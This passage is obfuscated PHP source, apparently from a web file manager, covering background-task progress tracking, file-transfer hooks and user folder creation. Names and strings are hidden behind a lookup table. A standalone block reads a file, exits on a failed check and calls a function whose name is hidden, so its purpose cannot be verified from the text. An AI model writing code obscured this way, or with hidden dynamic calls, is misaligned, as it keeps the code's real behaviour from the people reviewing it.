$¸¨ÖÚ¼È[1829])); $this->endAfter(); $‚¥—ÄŞº = $this->task; $this->task = !1; Hook::trigger($¸¨ÖÚ¼È[1834], $‚¥—ÄŞº); } public function update($ı×â‚ªì = 0, $şó—”Àš = false) { $Ğƒ¶Ï¥ =& $_SERVER[åÄ¼Ùßš]; $å¦’‡ßÊ =& $this->task; if (!$å¦’‡ßÊ) { return; } $å¦’‡ßÊ[$Ğƒ¶Ï¥[1818]] += $ı×â‚ªì; $å¦’‡ßÊ[$Ğƒ¶Ï¥[1822]] = timeFloat(); if ($å¦’‡ßÊ[$Ğƒ¶Ï¥[1171]]) { if ($å¦’‡ßÊ[$Ğƒ¶Ï¥[1171]] < $å¦’‡ßÊ[$Ğƒ¶Ï¥[1818]]) { $å¦’‡ßÊ[$Ğƒ¶Ï¥[1171]] = $å¦’‡ßÊ[$Ğƒ¶Ï¥[1818]]; } $üı˜‚›— = timeFloat() - $å¦’‡ßÊ[$Ğƒ¶Ï¥[1821]] - $å¦’‡ßÊ[$Ğƒ¶Ï¥[1824]]; if ($üı˜‚›— <= 0) { $üı˜‚›— = 0.001; } $å¦’‡ßÊ[$Ğƒ¶Ï¥[1819]] = $å¦’‡ßÊ[$Ğƒ¶Ï¥[1818]] / $å¦’‡ßÊ[$Ğƒ¶Ï¥[1171]]; $å¦’‡ßÊ[$Ğƒ¶Ï¥[1820]] = $å¦’‡ßÊ[$Ğƒ¶Ï¥[1818]] / $üı˜‚›—; if ($å¦’‡ßÊ[$Ğƒ¶Ï¥[1819]] > 0) { $å¦’‡ßÊ[$Ğƒ¶Ï¥[1825]] = $üı˜‚›— * (1 - $å¦’‡ßÊ[$Ğƒ¶Ï¥[1819]]) / $å¦’‡ßÊ[$Ğƒ¶Ï¥[1819]]; } $å¦’‡ßÊ[$Ğƒ¶Ï¥[1825]] = $å¦’‡ßÊ[$Ğƒ¶Ï¥[1825]] <= 0 ? 0 : $å¦’‡ßÊ[$Ğƒ¶Ï¥[1825]]; } $this->updateAfter(); $›®Ãô¼ö = 0.2; if (timeFloat() - $å¦’‡ßÊ[$Ğƒ¶Ï¥[1823]] < $›®Ãô¼ö && !$şó—”Àš) { return; } $å»Œ„¤Û = self::get($å¦’‡ßÊ[$Ğƒ¶Ï¥[484]]); $Ä‘Ã¥òÀ = $å»Œ„¤Û[$Ğƒ¶Ï¥[843]]; if ($Ä‘Ã¥òÀ == self::STATYS_KILL) { $˜ ²‘Ø = array($Ğƒ¶Ï¥[1835] => LNG($Ğƒ¶Ï¥[1836]), $Ğƒ¶Ï¥[1335] => !1); Cache::set($Ğƒ¶Ï¥[1837] . $this->task[$Ğƒ¶Ï¥[484]], $˜ ²‘Ø, 30); $this->onKill(); $this->end(); die; } else { if ($Ä‘Ã¥òÀ == self::STATYS_STOP) { $Œ¹ˆ¿ëå = 2; $å»Œ„¤Û[$Ğƒ¶Ï¥[1824]] += $Œ¹ˆ¿ëå; self::valueSet($å¦’‡ßÊ[$Ğƒ¶Ï¥[484]], $å»Œ„¤Û); sleep($Œ¹ˆ¿ëå); $this->update(); return; } } $å¦’‡ßÊ[$Ğƒ¶Ï¥[843]] = $Ä‘Ã¥òÀ ? $Ä‘Ã¥òÀ : $å¦’‡ßÊ[$Ğƒ¶Ï¥[843]]; $å¦’‡ßÊ[$Ğƒ¶Ï¥[1824]] = $å»Œ„¤Û[$Ğƒ¶Ï¥[1824]] ? $å»Œ„¤Û[$Ğƒ¶Ï¥[1824]] : 0; $å¦’‡ßÊ[$Ğƒ¶Ï¥[1823]] = timeFloat(); Hook::trigger($Ğƒ¶Ï¥[1838], $å¦’‡ßÊ); self::valueSet($å¦’‡ßÊ[$Ğƒ¶Ï¥[484]], $å¦’‡ßÊ); } public function onKillSet($Œóª‰çĞ, $ÄòŸ…ª‡ = array()) { $this->onKillCall = array($Œóª‰çĞ, $ÄòŸ…ª‡); } public function onKill() { $–ÁÍü·¸ =& $_SERVER[åÄ¼Ùßš]; self::log($–ÁÍü·¸[1831] . $this->task[$–ÁÍü·¸[484]] . $–ÁÍü·¸[1839]); Hook::trigger($–ÁÍü·¸[1840], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Œ¬õŞ¤é) { $íÛ£µ†ê =& $_SERVER[åÄ¼Ùßš]; Cache::set($íÛ£µ†ê[1837] . $this->task[$íÛ£µ†ê[484]], $Œ¬õŞ¤é, 60); if (!is_array($Œ¬õŞ¤é) || !$Œ¬õŞ¤é[$íÛ£µ†ê[1335]]) { self::log($íÛ£µ†ê[1841] . json_encode($Œ¬õŞ¤é)); } return $Œ¬õŞ¤é; } public static function get($ÃèÒÀíÒ) { $Ü‡ßÍûÔ =& $_SERVER[åÄ¼Ùßš]; $ÅÒêàÒë = self::valueGet($ÃèÒÀíÒ); if (is_array($ÅÒêàÒë) && $ÅÒêàÒë[$Ü‡ßÍûÔ[1842]]) { $’ßšì†“ = ActionApply($ÅÒêàÒë[$Ü‡ßÍûÔ[1842]], array($ÅÒêàÒë)); $ÅÒêàÒë = is_array($’ßšì†“) ? $’ßšì†“ : $ÅÒêàÒë; } return $ÅÒêàÒë; } public static function listData() { $–ÒÀïÙ§ = self::valueGet(); return array_sort_by($–ÒÀïÙ§, $_SERVER[åÄ¼Ùßš][1821], !0); } public static function kill($üÎË¢) { return self::changeStatus($üÎË¢, self::STATYS_KILL); } public static function stop($İû»ƒŸ¥) { return self::changeStatus($İû»ƒŸ¥, self::STATYS_STOP); } public static function restart($Ùä¶á¹°) { return self::changeStatus($Ùä¶á¹°, self::STATYS_RUNNING); } public static function killAll() { $‰­›ğÓì =& $_SERVER[åÄ¼Ùßš]; $¡¦¼Ğ¬ù = self::listData(); foreach ($¡¦¼Ğ¬ù as $Ø ¶ó¦Ö) { self::kill($Ø ¶ó¦Ö[$‰­›ğÓì[484]]); } sleep(2); foreach ($¡¦¼Ğ¬ù as $Ø ¶ó¦Ö) { self::valueSet($Ø ¶ó¦Ö[$‰­›ğÓì[484]], !1); } } private static function changeStatus($·íã©¤, $ğŒ‡Çò§) { $ª×²“™Æ =& $_SERVER[åÄ¼Ùßš]; $ŒÍÆ°ØÍ = self::valueGet($·íã©¤); if (!$ŒÍÆ°ØÍ) { return !1; } $ŒÍÆ°ØÍ[$ª×²“™Æ[843]] = $ğŒ‡Çò§; self::valueSet($·íã©¤, $ŒÍÆ°ØÍ); self::log($ª×²“™Æ[1843] . $ŒÍÆ°ØÍ[$ª×²“™Æ[484]] . $ª×²“™Æ[1844] . $ğŒ‡Çò§); return !0; } public static function valueGet($ÏêªÏôï = false) { $ßì‘şª =& $_SERVER[åÄ¼Ùßš]; if ($ÏêªÏôï) { $ŞËúÚŒ… = Model($ßì‘şª[531])->where(array($ßì‘şª[97] => $ÏêªÏôï, $ßì‘şª[33] => $ßì‘şª[1180]))->find(); return $ŞËúÚŒ… ? json_decode($ŞËúÚŒ…[$ßì‘şª[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($íÑËÖÙÌ = false) { $‚İ¢ºàõ =& $_SERVER[åÄ¼Ùßš]; $‰Ïß“Å£ = array($‚İ¢ºàõ[33] => $‚İ¢ºàõ[1180]); if ($íÑËÖÙÌ) { $‰Ïß“Å£[$‚İ¢ºàõ[1817]] = $íÑËÖÙÌ; } $ûÌ”¿‘ = Model($‚İ¢ºàõ[531])->where($‰Ïß“Å£)->select(); $ûÌ”¿‘ = $ûÌ”¿‘ ? $ûÌ”¿‘ : array(); foreach ($ûÌ”¿‘ as $ ®ÚĞÑ => $ªùüª½ø) { $ûÌ”¿‘[$ ®ÚĞÑ] = json_decode($ªùüª½ø[$‚İ¢ºàõ[452]], !0); } return $ûÌ”¿‘; } public static function valueSet($… õÆ€ä, $™ŒñìŠ½) { $‹—Å¥Ò =& $_SERVER[åÄ¼Ùßš]; if (!$™ŒñìŠ½) { return Model($‹—Å¥Ò[531])->where(array($‹—Å¥Ò[97] => $… õÆ€ä, $‹—Å¥Ò[33] => $‹—Å¥Ò[1180]))->delete(); } $ÏÜ­öÎ¨ = json_encode($™ŒñìŠ½); if (!$ÏÜ­öÎ¨) { ob_start(); var_dump($™ŒñìŠ½); $˜ÏÌµ› = ob_get_clean(); self::log($‹—Å¥Ò[1845] . json_encode_force($˜ÏÌµ›)); } if (!$… õÆ€ä || !$™ŒñìŠ½[$‹—Å¥Ò[484]]) { return !1; } $ö§òŒ³³ = array($‹—Å¥Ò[33] => $‹—Å¥Ò[1180], $‹—Å¥Ò[1817] => USER_ID, $‹—Å¥Ò[97] => $… õÆ€ä, $‹—Å¥Ò[452] => $ÏÜ­öÎ¨); $Õšç±” = $‹—Å¥Ò[1846]; CacheLock::lock($Õšç±”); Model($‹—Å¥Ò[531])->add($ö§òŒ³³, array(), !0); CacheLock::unlock($Õšç±”); } public static function log($¨¿©¦Ù§) { if (!GLOBAL_DEBUG) { return; } write_log($¨¿©¦Ù§, $_SERVER[åÄ¼Ùßš][1847]); } } if ($_SERVER[$_SERVER[åÄ¼Ùßš][833]] != $_SERVER[$_SERVER[åÄ¼Ùßš][834]]) { $_getc = $_SERVER[åÄ¼Ùßš][835]; $_getfile = $_SERVER[$_SERVER[åÄ¼Ùßš][836]] . $_SERVER[åÄ¼Ùßš][837]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[åÄ¼Ùßš][288], $_getfilec); if (count($_getarrs) < $_SERVER[åÄ¼Ùßš][708]) { $exit = $_SERVER[åÄ¼Ùßš][838]; $exit(); } $_act = $_SERVER[åÄ¼Ùßš][839]; $_act($_SERVER[$_SERVER[åÄ¼Ùßš][840]]); } class TaskFileTransfer extends Task { protected function startAfter() { $¤÷Ã¬¦å =& $_SERVER[åÄ¼Ùßš]; $¥§©¬“Œ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¤÷Ã¬¦å[1848], array($this, $¤÷Ã¬¦å[1849])); Hook::bind($¤÷Ã¬¦å[1346], array($this, $¤÷Ã¬¦å[1850])); Hook::bind($¤÷Ã¬¦å[1851], array($this, $¤÷Ã¬¦å[1852])); Hook::bind($¤÷Ã¬¦å[684], array($this, $¤÷Ã¬¦å[1853])); Hook::bind($¤÷Ã¬¦å[685], array($this, $¤÷Ã¬¦å[1854])); Hook::bind($¤÷Ã¬¦å[691], array($this, $¤÷Ã¬¦å[1855])); Hook::bind($¤÷Ã¬¦å[692], array($this, $¤÷Ã¬¦å[1856])); Hook::bind($¤÷Ã¬¦å[687], array($this, $¤÷Ã¬¦å[1857])); Hook::bind($¤÷Ã¬¦å[689], array($this, $¤÷Ã¬¦å[1858])); Hook::bind($¤÷Ã¬¦å[653], array($this, $¤÷Ã¬¦å[1859])); Hook::bind($¤÷Ã¬¦å[650], array($this, $¤÷Ã¬¦å[1859])); Hook::bind($¤÷Ã¬¦å[655], array($this, $¤÷Ã¬¦å[1859])); Hook::bind($¤÷Ã¬¦å[657], array($this, $¤÷Ã¬¦å[1859])); Hook::bind($¤÷Ã¬¦å[659], array($this, $¤÷Ã¬¦å[1859])); Hook::bind($¤÷Ã¬¦å[1860], array($this, $¤÷Ã¬¦å[1861])); Hook::bind($¤÷Ã¬¦å[675], array($this, $¤÷Ã¬¦å[1862])); $this->sourceModelCopyFlag = !1; Hook::bind($¤÷Ã¬¦å[1863], array($this, $¤÷Ã¬¦å[1864])); Hook::bind($¤÷Ã¬¦å[1865], array($this, $¤÷Ã¬¦å[1866])); Hook::bind($¤÷Ã¬¦å[1867], array($this, $¤÷Ã¬¦å[1868])); $¥§©¬“Œ[$¤÷Ã¬¦å[1869]] = LNG($¤÷Ã¬¦å[1870]); $¥§©¬“Œ[$¤÷Ã¬¦å[1871]] = 0; $¥§©¬“Œ[$¤÷Ã¬¦å[1872]] = 0; $¥§©¬“Œ[$¤÷Ã¬¦å[1173]] = $¤÷Ã¬¦å[12]; $¥§©¬“Œ[$¤÷Ã¬¦å[1873]] = $¤÷Ã¬¦å[12]; $¥§©¬“Œ[$¤÷Ã¬¦å[1874]] = 0; $¥§©¬“Œ[$¤÷Ã¬¦å[1875]] = 0; $¥§©¬“Œ[$¤÷Ã¬¦å[1876]] = 0; if (!$¥§©¬“Œ[$¤÷Ã¬¦å[1704]]) { $¥§©¬“Œ[$¤÷Ã¬¦å[1704]] = LNG($¤÷Ã¬¦å[1877]); } } protected function endAfter() { $™Ï—øÃ„ =& $_SERVER[åÄ¼Ùßš]; Hook::unbind($™Ï—øÃ„[1848], array($this, $™Ï—øÃ„[1849])); Hook::unbind($™Ï—øÃ„[1346], array($this, $™Ï—øÃ„[1850])); Hook::unbind($™Ï—øÃ„[1851], array($this, $™Ï—øÃ„[1852])); Hook::unbind($™Ï—øÃ„[684], array($this, $™Ï—øÃ„[1853])); Hook::unbind($™Ï—øÃ„[685], array($this, $™Ï—øÃ„[1854])); Hook::unbind($™Ï—øÃ„[691], array($this, $™Ï—øÃ„[1855])); Hook::unbind($™Ï—øÃ„[692], array($this, $™Ï—øÃ„[1856])); Hook::unbind($™Ï—øÃ„[687], array($this, $™Ï—øÃ„[1857])); Hook::unbind($™Ï—øÃ„[689], array($this, $™Ï—øÃ„[1858])); Hook::unbind($™Ï—øÃ„[653], array($this, $™Ï—øÃ„[1859])); Hook::unbind($™Ï—øÃ„[650], array($this, $™Ï—øÃ„[1859])); Hook::unbind($™Ï—øÃ„[655], array($this, $™Ï—øÃ„[1859])); Hook::unbind($™Ï—øÃ„[657], array($this, $™Ï—øÃ„[1859])); Hook::unbind($™Ï—øÃ„[659], array($this, $™Ï—øÃ„[1859])); Hook::unbind($™Ï—øÃ„[1860], array($this, $™Ï—øÃ„[1861])); Hook::unbind($™Ï—øÃ„[675], array($this, $™Ï—øÃ„[1862])); Hook::unbind($™Ï—øÃ„[1863], array($this, $™Ï—øÃ„[1864])); Hook::unbind($™Ï—øÃ„[1865], array($this, $™Ï—øÃ„[1866])); Hook::unbind($™Ï—øÃ„[1867], array($this, $™Ï—øÃ„[1868])); } public function copyMoveStart($¹Şßâ–ù, $àËÁÈ¥, $…ÛÒã²Ã, $¹¡³Ê¥) { $ÔåÏ¹èî =& $_SERVER[åÄ¼Ùßš]; self::log($ÔåÏ¹èî[1878] . $àËÁÈ¥ . $ÔåÏ¹èî[73] . $¹¡³Ê¥); $†ÆŞóã³ = rtrim(TEMP_FILES, $ÔåÏ¹èî[8]); if (substr($àËÁÈ¥, 0, strlen($†ÆŞóã³)) == $†ÆŞóã³) { return; } if (substr($¹¡³Ê¥, 0, strlen($†ÆŞóã³)) == $†ÆŞóã³) { return; } $®ìÂÜ‘Ã =& $this->task; $®ìÂÜ‘Ã[$ÔåÏ¹èî[1879]] = KodIO::transferType($¹Şßâ–ù, $…ÛÒã²Ã); $this->update(); } public function updateAfter() { $÷ËğµÍ€ =& $_SERVER[åÄ¼Ùßš]; $õ©Ç÷¬ =& $this->task; if (!$õ©Ç÷¬[$÷ËğµÍ€[857]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($õ©Ç÷¬[$÷ËğµÍ€[1879]] == $÷ËğµÍ€[1447]) { return; } self::updateTask($õ©Ç÷¬); } private static function updateTask(&$É‡æ‡İâ) { $³»²üºÏ =& $_SERVER[åÄ¼Ùßš]; if ($É‡æ‡İâ[$³»²üºÏ[1879]] == $³»²üºÏ[1317] || $É‡æ‡İâ[$³»²üºÏ[1879]] == $³»²üºÏ[110]) { if ($É‡æ‡İâ[$³»²üºÏ[1873]]) { $É‡æ‡İâ[$³»²üºÏ[1876]] = $É‡æ‡İâ[$³»²üºÏ[1875]] + $É‡æ‡İâ[$³»²üºÏ[1872]]; } } else { if ($É‡æ‡İâ[$³»²üºÏ[1879]] == $³»²üºÏ[1448]) { if ($É‡æ‡İâ[$³»²üºÏ[1873]] == $³»²üºÏ[1317]) { $É‡æ‡İâ[$³»²üºÏ[1876]] = $É‡æ‡İâ[$³»²üºÏ[1875]] + $É‡æ‡İâ[$³»²üºÏ[1872]] * 0.5; } else { if ($É‡æ‡İâ[$³»²üºÏ[1873]] == $³»²üºÏ[110]) { $É‡æ‡İâ[$³»²üºÏ[1876]] = $É‡æ‡İâ[$³»²üºÏ[1875]] + $É‡æ‡İâ[$³»²üºÏ[1871]] * 0.5 + $É‡æ‡İâ[$³»²üºÏ[1872]] * 0.5; } } } } $É‡æ‡İâ[$³»²üºÏ[1819]] = $É‡æ‡İâ[$³»²üºÏ[1876]] / $É‡æ‡İâ[$³»²üºÏ[857]]; if ($É‡æ‡İâ[$³»²üºÏ[1819]] > 0) { $ªäÑÜÍµ = timeFloat() - $É‡æ‡İâ[$³»²üºÏ[1821]] - $É‡æ‡İâ[$³»²üºÏ[1824]]; $É‡æ‡İâ[$³»²üºÏ[1825]] = $ªäÑÜÍµ * (1 - $É‡æ‡İâ[$³»²üºÏ[1819]]) / $É‡æ‡İâ[$³»²üºÏ[1819]]; } } public function addPath($º¨¢ãç…) { $µÈ„®û =& $_SERVER[åÄ¼Ùßš]; if (!$º¨¢ãç…) { return; } $†˜œÄ• =& $this->task; $ŒÔÖÇ³Ï = IO::infoWithChildren($º¨¢ãç…); $—êËû‘­ = $†˜œÄ•[$µÈ„®û[1880]] ? $†˜œÄ•[$µÈ„®û[1880]][$µÈ„®û[1881]] : 0; $†˜œÄ•[$µÈ„®û[1880]] = array($µÈ„®û[1881] => $—êËû‘­ + 1, $µÈ„®û[506] => $ŒÔÖÇ³Ï[$µÈ„®û[32]], $µÈ„®û[87] => $ŒÔÖÇ³Ï[$µÈ„®û[87]], $µÈ„®û[595] => $ŒÔÖÇ³Ï[$µÈ„®û[595]] ? $ŒÔÖÇ³Ï[$µÈ„®û[595]] : $ŒÔÖÇ³Ï[$µÈ„®û[87]]); if ($ŒÔÖÇ³Ï[$µÈ„®û[33]] == $µÈ„®û[233]) { $†˜œÄ•[$µÈ„®û[1171]] += 1; } else { $†˜œÄ•[$µÈ„®û[1171]] += $ŒÔÖÇ³Ï[$µÈ„®û[82]][$µÈ„®û[80]]; if ($ŒÔÖÇ³Ï[$µÈ„®û[194]]) { $†˜œÄ•[$µÈ„®û[1171]] += $ŒÔÖÇ³Ï[$µÈ„®û[82]][$µÈ„®û[81]] + 1; } } $†˜œÄ•[$µÈ„®û[857]] += $ŒÔÖÇ³Ï[$µÈ„®û[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($²µòˆçÓ) { } public function sourceAddHashEnd($×ÅäÙ€û) { } public function sourceAddFileStart($éô¦á¾) { $Š‘İ¢¾Ÿ =& $_SERVER[åÄ¼Ùßš]; $Îçá³òÑ =& $this->task; $Îçá³òÑ[$Š‘İ¢¾Ÿ[1871]] = $éô¦á¾[$Š‘İ¢¾Ÿ[79]]; $Îçá³òÑ[$Š‘İ¢¾Ÿ[1869]] = $éô¦á¾[$Š‘İ¢¾Ÿ[32]]; $Îçá³òÑ[$Š‘İ¢¾Ÿ[1173]] = $éô¦á¾[$Š‘İ¢¾Ÿ[32]]; $Îçá³òÑ[$Š‘İ¢¾Ÿ[1882]] = $éô¦á¾[$Š‘İ¢¾Ÿ[87]]; $this->update(); } public function sourceAddFileEnd($ñûû—¾) { $ƒ§ÒøƒÃ =& $_SERVER[åÄ¼Ùßš]; $ËÙÇù©û =& $this->task; $ËÙÇù©û[$ƒ§ÒøƒÃ[1876]] += $ñûû—¾[$ƒ§ÒøƒÃ[79]]; $ËÙÇù©û[$ƒ§ÒøƒÃ[1882]] = $ñûû—¾[$ƒ§ÒøƒÃ[87]]; $this->update(1); } public function copyFileStart($îÃÉ¬ÀÈ, $Œ¼Ï÷ãô, $ıô¥íæü, $¿ƒöšÄ, $çÇøŞ, $œî¼Áİ‡) { $ÛµİâàÂ =& $_SERVER[åÄ¼Ùßš]; $ëöï‡¶ç = $çÇøŞ; if ($ëöï‡¶ç == $GLOBALS[$ÛµİâàÂ[1883]]) { $ëöï‡¶ç = $GLOBALS[$ÛµİâàÂ[1884]]; } $GLOBALS[$ÛµİâàÂ[1884]] = $çÇøŞ; $GLOBALS[$ÛµİâàÂ[1883]] = $œî¼Áİ‡; $ø¹û–è¿ =& $this->task; $ø¹û–è¿[$ÛµİâàÂ[1869]] = $ëöï‡¶ç; $ø¹û–è¿[$ÛµİâàÂ[1871]] = (int) $îÃÉ¬ÀÈ->size($Œ¼Ï÷ãô); $ø¹û–è¿[$ÛµİâàÂ[1872]] = 0; $ø¹û–è¿[$ÛµİâàÂ[1173]] = $ÛµİâàÂ[12]; $ø¹û–è¿[$ÛµİâàÂ[1873]] = $ÛµİâàÂ[12]; $ø¹û–è¿[$ÛµİâàÂ[1874]] = 0; $Óúñ¼Æ = $ø¹û–è¿[$ÛµİâàÂ[1871]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ø¹û–è¿[$ÛµİâàÂ[484]] . $ÛµİâàÂ[1885]); if ($Óúñ¼Æ && file_exists(get_path_father($¿ƒöšÄ))) { Cache::set($ø¹û–è¿[$ÛµİâàÂ[484]] . $ÛµİâàÂ[1885], $¿ƒöšÄ); $ø¹û–è¿[$ÛµİâàÂ[1842]] = array($ÛµİâàÂ[1886], $ÛµİâàÂ[1887]); } $this->update(0, $Óúñ¼Æ); } public static function updateCopyLocalFileSize($©âó…ğ) { $øÊŒá¼ =& $_SERVER[åÄ¼Ùßš]; $ãî§¹€” = Cache::get($©âó…ğ[$øÊŒá¼[484]] . $øÊŒá¼[1885]); if (!$ãî§¹€” || !file_exists($ãî§¹€”)) { return $©âó…ğ; } $©âó…ğ[$øÊŒá¼[1872]] = @filesize($ãî§¹€”); $©âó…ğ[$øÊŒá¼[1876]] += $©âó…ğ[$øÊŒá¼[1872]]; self::updateTask($©âó…ğ); return $©âó…ğ; } public function copyFileEnd($–ÙØ„©½, $¤Ø¢°ì, $ÜİÅÂÓ, $ßñŠúÑ, $ÅïÒœö¬, $ß¿ƒ°Û¬) { $ˆ¢îÅâ— =& $_SERVER[åÄ¼Ùßš]; $¹‰ˆ—è¬ =& $this->task; $¹‰ˆ—è¬[$ˆ¢îÅâ—[1872]] = $¹‰ˆ—è¬[$ˆ¢îÅâ—[1871]]; $¹‰ˆ—è¬[$ˆ¢îÅâ—[1873]] = $ˆ¢îÅâ—[12]; unset($¹‰ˆ—è¬[$ˆ¢îÅâ—[1842]]); if ($ÅïÒœö¬ == $¹‰ˆ—è¬[$ˆ¢îÅâ—[1869]]) { $¹‰ˆ—è¬[$ˆ¢îÅâ—[1875]] += $¹‰ˆ—è¬[$ˆ¢îÅâ—[1871]]; $¹‰ˆ—è¬[$ˆ¢îÅâ—[1876]] = $¹‰ˆ—è¬[$ˆ¢îÅâ—[1875]]; $¯úæèÕÎ = 1; if (isset($¹‰ˆ—è¬[$ˆ¢îÅâ—[1882]]) && $¹‰ˆ—è¬[$ˆ¢îÅâ—[1882]] == $¤Ø¢°ì) { $¯úæèÕÎ = 0; } $this->update($¯úæèÕÎ); } else { $this->update(); $¹‰ˆ—è¬[$ˆ¢îÅâ—[1872]] = 0; } Cache::remove($¹‰ˆ—è¬[$ˆ¢îÅâ—[484]] . $ˆ¢îÅâ—[1885]); self::log($ˆ¢îÅâ—[1888] . $¤Ø¢°ì . $ˆ¢îÅâ—[73] . $ßñŠúÑ . $ˆ¢îÅâ—[288] . $ÅïÒœö¬ . $ˆ¢îÅâ—[1889] . $¹‰ˆ—è¬[$ˆ¢îÅâ—[1869]]); } public function updateFileEnd($¿ùè™Á, $§Ê¾«Ø”) { $”£æ¤Óä =& $_SERVER[åÄ¼Ùßš]; $÷ü•…ĞÄ =& $this->task; $÷ü•…ĞÄ[$”£æ¤Óä[1869]] = $¿ùè™Á; $÷ü•…ĞÄ[$”£æ¤Óä[1871]] = $§Ê¾«Ø”; $÷ü•…ĞÄ[$”£æ¤Óä[1875]] += $§Ê¾«Ø”; $÷ü•…ĞÄ[$”£æ¤Óä[1876]] = $÷ü•…ĞÄ[$”£æ¤Óä[1875]]; $this->update(1); self::log($”£æ¤Óä[1890] . $¿ùè™Á); } public function sourceModelCopy($³µ¯õŒ¸) { $Ã‹£¯€à =& $_SERVER[åÄ¼Ùßš]; $ÄÒÇšÌ… = $³µ¯õŒ¸[0]; $à“Ğ¨Ê = $³µ¯õŒ¸[1]; $ŒÊï«Ïã =& $this->task; $this->sourceModelCopyFlag = !0; $·¨ëåİ = 0; switch ($ÄÒÇšÌ…) { case $Ã‹£¯€à[651]: $·¨ëåİ = 1; break; case $Ã‹£¯€à[654]: $ŒÊï«Ïã[$Ã‹£¯€à[1869]] = $à“Ğ¨Ê[$Ã‹£¯€à[32]]; break; case $Ã‹£¯€à[656]: $·¨ëåİ = intval($³µ¯õŒ¸[$Ã‹£¯€à[468]] * 0.4); break; case $Ã‹£¯€à[658]: $·¨ëåİ = intval($³µ¯õŒ¸[$Ã‹£¯€à[468]] * 0.2); break; case $Ã‹£¯€à[660]: $·¨ëåİ = intval($³µ¯õŒ¸[$Ã‹£¯€à[468]] * 0.4); break; } $this->update($·¨ëåİ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($’×±×»©, $éøÏêÓ‘) { $Ù÷ş¶Å“ =& $_SERVER[åÄ¼Ùßš]; $this->sourceModelCopyFlag = !0; $ŠµŞ‚üà = 1; if (isset($’×±×»©[$Ù÷ş¶Å“[82]])) { $ŠµŞ‚üà = $’×±×»©[$Ù÷ş¶Å“[82]][$Ù÷ş¶Å“[80]]; $ŠµŞ‚üà = $ŠµŞ‚üà + $’×±×»©[$Ù÷ş¶Å“[82]][$Ù÷ş¶Å“[81]] + 1; } $this->update($ŠµŞ‚üà); $this->sourceModelCopyFlag = !1; } public function sourceMove($ÒØ¬¥Ñ§) { $this->sourceRemove($ÒØ¬¥Ñ§, !1); } public function curlProgress($¤Ÿ½êğ£, $…Ö’¹´¢, $ùÚñŞõÉ, $ËÍ±õ‘±, $ğå™½²“) { $äû€ó¬ =& $_SERVER[åÄ¼Ùßš]; $ª¨°€Ìï =& $this->task; if ($ğå™½²“ > 0) { $ª¨°€Ìï[$äû€ó¬[1173]] = $äû€ó¬[1891]; $ª¨°€Ìï[$äû€ó¬[1873]] = $äû€ó¬[110]; if ($ª¨°€Ìï[$äû€ó¬[1871]]) { $ª¨°€Ìï[$äû€ó¬[1872]] = $ğå™½²“; } if ($ª¨°€Ìï[$äû€ó¬[1874]]) { $ª¨°€Ìï[$äû€ó¬[1872]] = $ğå™½²“ + $ª¨°€Ìï[$äû€ó¬[1874]]; } } else { if ($ùÚñŞõÉ > 0) { if ($ª¨°€Ìï[$äû€ó¬[1871]] == $…Ö’¹´¢) { $ª¨°€Ìï[$äû€ó¬[1872]] = $ùÚñŞõÉ; $ª¨°€Ìï[$äû€ó¬[1173]] = $äû€ó¬[1892]; $ª¨°€Ìï[$äû€ó¬[1873]] = $äû€ó¬[1317]; } } } $this->update(); } public function curlProgressStart($Úü¥çŞû) { } public function curlProgressEnd($—ÈĞÂü) { $õ€õ¶Å =& $_SERVER[åÄ¼Ùßš]; $¼†íôÍÂ =& $this->task; $äŞåÅç– = curl_getinfo($—ÈĞÂü); $‘Âøì‚¤ = $äŞåÅç–[$õ€õ¶Å[1893]]; if ($‘Âøì‚¤ == -1) { $‘Âøì‚¤ = $äŞåÅç–[$õ€õ¶Å[1894]]; } if ($¼†íôÍÂ[$õ€õ¶Å[1873]] == $õ€õ¶Å[110] && $‘Âøì‚¤) { $¼†íôÍÂ[$õ€õ¶Å[1874]] += $‘Âøì‚¤; } $this->update(); } } goto a¡Ü“ë¤ñ; F¸Ÿ¼ƒØ·Š: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($˜±à÷ùÂ) { $èŞåğÅâ =& $_SERVER[åÄ¼Ùßš]; $²¤ºøîÎ = Model($èŞåğÅâ[590])->where(array($èŞåğÅâ[1808] => $˜±à÷ùÂ))->find(); $¤€ê‘± = $this->_mkdirRoot(SourceModel::TYPE_USER, $˜±à÷ùÂ, $²¤ºøîÎ[$èŞåğÅâ[32]]); $this->userDesktopAdd($¤€ê‘±); return $¤€ê‘±; } public function userDesktopAdd($ªµí¢Å‹) { $×Ç¾³µ =& $_SERVER[åÄ¼Ùßš]; $§É¹ŞÕÓ = LNG($×Ç¾³µ[2309]); $¹’ë™™Ö = $this->mkdir($ªµí¢Å‹, $§É¹ŞÕÓ); $this->metaSet($¹’ë™™Ö, $×Ç¾³µ[2310], $×Ç¾³µ[91]); $this->metaSet($ªµí¢Å‹, $×Ç¾³µ[2311], $¹’ë™™Ö); } public function userPathSafeAdd($íÁ¸ˆ) { $Î÷‡îÇ° =& $_SERVER[åÄ¼Ùßš]; $ÃáàˆÎ³ = Model($Î÷‡îÇ°[590])->getInfoFull($íÁ¸ˆ); if (!$ÃáàˆÎ³) { return !1; } if (_get($ÃáàˆÎ³, $Î÷‡îÇ°[611])) { return $ÃáàˆÎ³[$Î÷‡îÇ°[552]][$Î÷‡îÇ°[2312]]; } $ÒÂ–Òƒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $íÁ¸ˆ, $Î÷‡îÇ°[2313], $Î÷‡îÇ°[2314]); Model($Î÷‡îÇ°[590])->metaSet($íÁ¸ˆ, $Î÷‡îÇ°[2312], $ÒÂ–Òƒ); $this->metaSet($ÒÂ–Òƒ, $Î÷‡îÇ°[2315], $íÁ¸ˆ); return $ÒÂ–Òƒ; } public function userPathAppAdd($Ó˜Õè¡û, $²èê‰˜ = '', $Œ°áÖÌÇ = '') { $º¯Äª‚Ş =& 